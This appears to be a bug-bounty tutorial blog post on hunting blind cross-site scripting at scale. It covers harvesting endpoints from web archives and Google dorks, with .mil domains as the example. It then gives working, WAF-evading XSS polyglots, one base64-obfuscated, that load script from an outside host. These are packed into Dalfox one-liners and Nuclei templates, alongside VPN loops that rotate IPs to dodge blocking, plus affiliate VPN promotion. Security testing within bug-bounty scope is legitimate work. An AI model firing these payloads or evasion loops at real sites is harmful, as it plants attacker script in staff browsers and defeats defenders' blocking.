# :globe_with_meridians: Mass Hunting Blind XSS - Practical Techniques

---

# Mass Hunting Blind XSS — Practical Techniques

In this article, I will reveal the techniques for detecting Blind Cross-Site Scripting at scale. We will dive into the Blind XSS payloads used to bypass WAF, open-source tools from GitHub, and methodology. Most parts of this could be automated, but keep in mind that manual testing usually could give more convenient results!

This is a continuation of Mass Hunting for BXSS — initial setup article. If you haven’t yet set up your BXSS server, be sure to do that first. Don’t miss out on the valuable tips shared in the previous guide!

## Preparing Endpoint List

To effectively hunt for Blind Cross-Site Scripting, it’s crucial to understand where these vulnerabilities typically occur. Identifying points where user input is processed is the key to success. As we know, the usual sinks of Blind XSS are administration panels of the employees. When considering where you want to spray BXSS payloads, try to think of data that that employee would like to inspect at some point. I will give you some examples, to get the ball rolling:

- **Customer feedback** — look for areas where customers can leave comments or feedback, as these inputs are often reviewed by staff for quality or service improvements.

- **Header data like User-Agent** — injecting payloads into HTTP headers, can be effective since this data is frequently logged and monitored for analytics or troubleshooting. This could surely pop the JS function on monitoring employees.

- **Invoice/receipt generation **— fields used in invoices or receipts that customers can customize, like notes or addresses, are often overlooked but regularly examined by accounting staff.

- **Support Chat **— messages sent through support or helpdesk systems are prime spots, as they’re closely read by support personnel.

- **Account Registration Information** — fields in user registration forms, like usernames or bio sections, can be a strategic place for payloads. Administrators can manually review this information for account verification or user management purposes.

Having this in mind, let’s target specific endpoints and try to build the list. I will cover 2 techniques that I usually use, but of course, there could be even more ways to do it!

## Method #1 — Wayback Machine Tools

I have already covered using the [gau](https://github.com/lc/gau) tool with axiom in the article about XSS. It works pretty fast to get endpoints from **web archive**, **urlscan**, **alienvault**, etc. I think if you aim for coverage, not for speed, you could also try [waymore](https://github.com/xnl-h4ck3r/waymore). For the sake of simplicity, I will only show how I collect potential endpoints for fuzzing using this tool for BXSS. For scaling it, I suggest using this tool as an axiom module since it works pretty well for targeting more than one program at once. Axiom works pretty well for the recon stage.

Firstly, just clone the GitHub repository and use python3 pip to install dependencies:

`git clone https://github.com/xnl-h4ck3r/waymore && cd waymore && pip3 install -r requirements.txt`

To run **waymore**, use python on target domains and their subdomains:

`python3 waymore.py -i input.txt -mode U -oU waymore.txt -r 3`

To unlock the full potential of this tool you could explore the flags and customize it to your own needs. For example, you could exclude subdomains using **-n** flag, or get files of responses using **-mode R** together with **-oR output_dir**.

Next, I highly recommend filtering out the collected endpoints for higher probabilities of Blind XSS occurring as mentioned before. For example, endpoints resembling feedback forms could include keywords **feedback**, **support**, etc.:

`cat waymore.txt | grep -viE '\.png|\.jpg|\.jpeg|\.css|\.js|\.svg|\.gif' | grep -iE 'feedback|support' | qsreplace FUZZ | sort -u | httpx -t 300 | anew waymore-filtered.txt`

Endpoints with user **registration** process, and **login**:

`cat waymore.txt | grep -viE '\.png|\.jpg|\.jpeg|\.css|\.js|\.svg|\.gif' | grep -iE 'login|register|auth|sign|account' | qsreplace FUZZ | sort -u | httpx -t 300 | anew waymore-filtered.txt`

Note that I have filtered out some extensions here, only selected desired keywords, and also used [qsreplace](https://github.com/tomnomnom/qsreplace) to reduce the number of results. The [httpx](https://github.com/projectdiscovery/httpx) at the end is for minimizing the results even more as it leaves only alive endpoints.

## Method #2 — Google Dorking

There are multiple ways to speedrun Google Hacking as I have already mentioned in this article. These techniques are pretty good for collecting large amounts of URLs from Google alone. The good thing is that those URLs will be alive in most cases and the filtering itself is made in the search bar. My favorite method is to use Firefox plugins — **Google Auto Load**, **FoxScroller**, and **Link Gopher**. But before using them, there should be a good dork selected. I am usually doing this manually for each target specific.

As an example, I will use a large-scope target like [U.S. Department of Defense](https://hackerone.com/deptofdefense) as it has a lot of domains under scope. Let’s divide this particular Google Dorking example into a few simple steps:

1. Start from the top domain using site: **target.com** keywords -filter -filter2… As for DoD, the top domain level could be **.mil**, so I will start with this one. As the keyword, I will use word feedback as it most likely could end up in the employee CRM/admin panel. Finally, the filter word will be appended at the end, for instance, I wouldn’t like the search to include **pdf**, **doc**, **xls** files, so I will exclude those. The final search will look like this:

`site:mil "feedback form" -pdf -doc -xls`

As you can see, there are many results, but you want to dig a little bit deeper into this rabbit hole.

2. Inspect the available subdomains on your search. Please choose one of them as the 2nd level sub, for example — **army.mil**. Copy your payload on the other tab but replace the **site:** value with your selected one:

From this point on, you could create new tabs and try switching between subs or keywords or even appending extra filter words. I suggest that your Google results shouldn’t be more than a few thousand.

3. Click on the **FoxScroller** plugin and wait till the browser scrolls to the end of the results page.

4. Use the **Link Gopher** plugin to **Extract All Links** from this fully loaded Google results page.

5. Append collected endpoints to the same file, repeat this with as many dorks as you can. You will have a pretty decent list of endpoints for applying BXSS payloads.

6. Now try to filter out only your target domain, since the **google.com** endpoints are usually not important, and run **httpx**:

`cat google.txt | grep -Ei '.mil' | httpx | tee google-filtered.txt`

## Testing Out Payloads

There are 3 main ways that I usually try fuzzing my collected list:

### 1# Manual approach

I can’t emphasize enough that the most success here could come by manually inspecting collected URLs and putting the payloads into the input fields. Sometimes it’s good practice to use [aquatone](https://github.com/michenriksen/aquatone) to screenshot endpoints and view grouped results. Remember that this list is not final, and some interesting endpoints could appear while doing some authenticated testing through Burp Suite.

## Get Ott3rly’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

I would also like to try discovering if there are some hidden parameters. For this purpose, I like to use [Arjun](https://github.com/s0md3v/Arjun). The command I usually firstly use for fuzzing params:

`arjun -u 'https://target.com/endpoint.php' -c 1000`

If you get some errors, try increasing/decreasing **-c** flag value, which means how many parameters to try per one HTTP request. By default, this tool scans around 26k common HTTP parameters, but if I want to go for higher coverage, you could try [assetnote’s params wordlist](https://wordlists-cdn.assetnote.io/data/automated/httparchive_parameters_top_1m_2023_12_28.txt):

`arjun -u 'https://target.com/endpoint.php' -c 1000 -w ~/wordlists/params.txt`

When finally submitting the POST HTTP request, there are a couple of BXSS payloads I like to use:

`'"><script src=//k0l.uk></script>`

`'"></script></title></textarea><script src=//k0l.uk></script>`

`--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://k0l.uk"></scrIpt>`

`'"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vazBsLnVrIjtkb2N1bWVudC5ib2R5LmFwcGVuZChhKTs='))//`

`/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>"//'//><scrIpt src="https://k0l.uk"></scrIpt>`

Keep in mind that you have to find the right balance between using too many HTML escape tags and using only a few. This is used only for escaping potential WAFs on backend systems. Sometimes only a simple **<script>** tag with the **src** attribute works, but sometimes there could be multiple layers of defense in place. That’s why you have to experiment with different payloads yourself and do some research on how **XSS polyglots** work.

## 2# Using XSS Framework

If you are looking for a bit of automation or running something in the background, you could use a CLI XSS scanner. There are multiple tools to choose from, but I recommend [Dalfox](https://github.com/hahwul/dalfox) since it has a blind XSS option available. I suggest filtering out your collected endpoints before running this, but the result for testing should be like this:

`cat waymore-filtered.txt google-filtered.txt | qsreplace FUZZ | dalfox pipe -S --waf-evasion --skip-mining-all --skip-headless --mass -b https://k0l.uk -o results.txt`

If you are going after a huge list of URLs, there could be some WAFs in place blocking requests. If I am testing from my local machine, I would like to use a VPN service. I have tried many, but I ended up sticking to using [NordVPN](https://ott3rly.com/NordVPN). It has many server locations with many different IPs which you could rotate after being blocked while testing. This VPN also has a CLI version, which is a big deal while running some testing in the background or building automation.

I like to change my IP after testing for 500 different endpoints. Let’s split the results into files with 500 lines each:

`cat waymore-filtered.txt google-filtered.txt > endpoints.txt && split -l 500 endpoints.txt`

Next, let’s use a one-liner that switches IP after testing 500 endpoints:

`for i in `ls x*`; do nordvpn connect && cat $i | qsreplace FUZZ | dalfox pipe -S --waf-evasion --skip-mining-all --skip-headless --mass -b https://k0l.uk -o results.tmp && cat results.tmp | anew results.txt; done`

**Tip:** If you consider using a VPN yourself, stay away from free ones, since those could be already blacklisted on WAFs or work very slowly. Trust me, is pretty convenient when it comes to security testing. Just click through my link to register as you will get a pretty good discount.

At this point, somebody might think that axiom could be used. **I do not recommend axiom with XSS frameworks, since it will create a lot of traffic!** This could look like a DDOS attack from the monitoring side. Your cloud provider might get an abuse report and you could get in trouble! You have been warned, so try to avoid this.

## 3# Employing Nuclei Templates

The last thing I would like to try as well is with custom templates. This tool is usually used to hunt CVE’s, but the version introduced URL fuzzing options. I have made a custom template with previously mentioned BXSS payloads. I suggest editing it yourself by replacing it with your own BXSS server or even adding more payloads:

```
id: fuzz-blind-xss

info:
name: Blind Cross Site Scripting
author: otterly
severity: medium
tags: xss,bxss,dast

requests:
- raw:
- |
POST {{Path}} HTTP/1.1
Host: {{Hostname}}
Referer: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

q={{url_encode(payload)}}&s={{url_encode(payload)}}&search={{url_encode(payload)}}&lang={{url_encode(payload)}}&keyword={{url_encode(payload)}}&query={{url_encode(payload)}}&page={{url_encode(payload)}}&keywords={{url_encode(payload)}}&year={{url_encode(payload)}}&view={{url_encode(payload)}}&email={{url_encode(payload)}}&type={{url_encode(payload)}}&name={{url_encode(payload)}}&p={{url_encode(payload)}}&callback={{url_encode(payload)}}&jsonp={{url_encode(payload)}}&api_key={{url_encode(payload)}}&api={{url_encode(payload)}}&password={{url_encode(payload)}}&email={{url_encode(payload)}}&emailto={{url_encode(payload)}}&token={{url_encode(payload)}}&username={{url_encode(payload)}}&csrf_token={{url_encode(payload)}}&unsubscribe_token={{url_encode(payload)}}&id={{url_encode(payload)}}&item={{url_encode(payload)}}&page_id={{url_encode(payload)}}&month={{url_encode(payload)}}&immagine={{url_encode(payload)}}&list_type={{url_encode(payload)}}&url={{url_encode(payload)}}&terms={{url_encode(payload)}}&categoryid={{url_encode(payload)}}&key={{url_encode(payload)}}&l={{url_encode(payload)}}&begindate={{url_encode(payload)}}&enddate={{url_encode(payload)}}

payloads:
payload:
- "`'\"><script src=//k0l.uk></script>"
- "`'\"></script></title></textarea><script src=//k0l.uk></script>"
- "--></tiTle></stYle></texTarea></scrIpt>\"//'//><scrIpt src=\"https://k0l.uk\"></scrIpt>"
- "`'\"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''\"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vazBsLnVrIjtkb2N1bWVudC5ib2R5LmFwcGVuZChhKTs='))//"
- "/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>\"//'//><scrIpt src=\"https://k0l.uk\"></scrIpt>"
```

This template is used for the POST HTTP request for a specified endpoint. I have included 38 potential parameters for the request body parameter guessing, from this [GF XSS pattern](https://raw.githubusercontent.com/1ndianl33t/Gf-Patterns/master/xss.json). You could include even more parameters, but keep in mind that this could look like a DoS attack, so don’t overuse it! Also, do not use axiom with this template, since it will put too much load on the servers. As I’ve mentioned, the best way is to use a [NordVPN](https://ott3rly.com/NordVPN) CLI here. Right now I suggest using IP change for even fewer endpoints:

`rm x* && cat waymore-filtered.txt google-filtered.txt > endpoints.txt && split -l 150 endpoints.txt`

And finally, running this template for each of the 150 endpoint file, having some 1min sleep time between each IP change:

`for i in `ls x*`; do nordvpn connect && cat $i | nuclei -t /path/to/fuzz-blind-xss.yaml | anew results.txt; sleep 60; done`

Another template I am also using is for the endpoints which already have some parameters in place:

```
id: fuzz-blind-xss-2

info:
name: Blind Cross Site Scripting
author: otterly
severity: medium
tags: xss,bxss,dast

http:
- method: GET
path:
- "{{BaseURL}}"

payloads:
payload:
- "`'\"><script src=//k0l.uk></script>"
- "`'\"></script></title></textarea><script src=//k0l.uk></script>"
- "--></tiTle></stYle></texTarea></scrIpt>\"//'//><scrIpt src=\"https://k0l.uk\"></scrIpt>"
- "`'\"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''\"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vazBsLnVrIjtkb2N1bWVudC5ib2R5LmFwcGVuZChhKTs='))//"
- "/*'/*`/*--></noscript></title></textarea></style></template></noembed></script>\"//'//><scrIpt src=\"https://k0l.uk\"></scrIpt>"

fuzzing:
- part: query
type: replace
mode: single
fuzz:
- "{{payload}}"
```

It will replace each parameter with the payload and run a separate request. Let’s try to use it as well for each 150 endpoint file:

`for i in `ls x*`; do nordvpn connect && cat $i | nuclei -t /path/to/fuzz-blind-xss.yaml | anew results.txt; sleep 60; done`

## Some Last Words…

- Target common Blind XSS sinks like **administration panels**, **customer feedback** sections, and **user input** fields in **account registration**.

- Use the **waymore** and **Google Dorking** for extracting URL endpoints.

- While inspecting manually, use **aquatone** for screenshotting, **arjun** — param guessing.

- XSS framework like **Dalfox** could be a good selection for automated XSS scanning. Customize payloads for WAF evasion. Use VPN!

- Nuclei templates could be utilized for more efficient fuzzing of collected endpoints. Do not use axiom for this! Axiom is mostly good for the recon stage.

Thank you for reading this! If you liked this article, smash that clap button 50 times! I am active on [Twitter](https://ott3rly.com/twitter), check out some content I post there daily! If you are interested in video content, check my [YouTube](https://ott3rly.com/youtube). Also, if you want to reach me personally, you can visit my [Discord](https://ott3rly.com/discord) server. Cheers!

---
